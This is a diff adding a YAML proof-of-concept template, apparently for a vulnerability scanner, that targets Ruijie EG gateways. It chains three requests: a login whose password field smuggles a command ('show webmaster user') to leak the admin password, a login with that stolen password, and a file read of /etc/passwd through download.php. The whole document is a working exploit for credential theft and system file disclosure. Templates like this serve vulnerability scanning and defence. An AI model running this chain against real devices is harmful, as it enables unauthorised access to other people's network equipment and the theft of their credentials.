@@ -1,0 +1,46 @@
+id: poc-yaml-ruijie-eg-file-read
+info:
+  name: Ruijie Eg File Read
+  severity: medium
+  tags:
+  - 文件读取
+  finger: Ruijie EG
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: POST
+  path: /login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=admin&password=admin?show+webmaster+user
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "text/json")
+  output:
+  - regex_match(body,"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)")
+- method: POST
+  path: /login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=admin&password={{.password}}
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "text/json") && contains(headers, "Set-Cookie") && contains(headers, "user=admin")
+    && contains(body, "{\"data\":\"0\",\"status\":1}")
+  output: []
+- method: POST
+  path: /download.php?a=read_txt
+  headers: {}
+  data: file=/etc/passwd
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "\"status\":true,") && matches(body,
+    "root:[x*]?:0:0:")
+  output: []
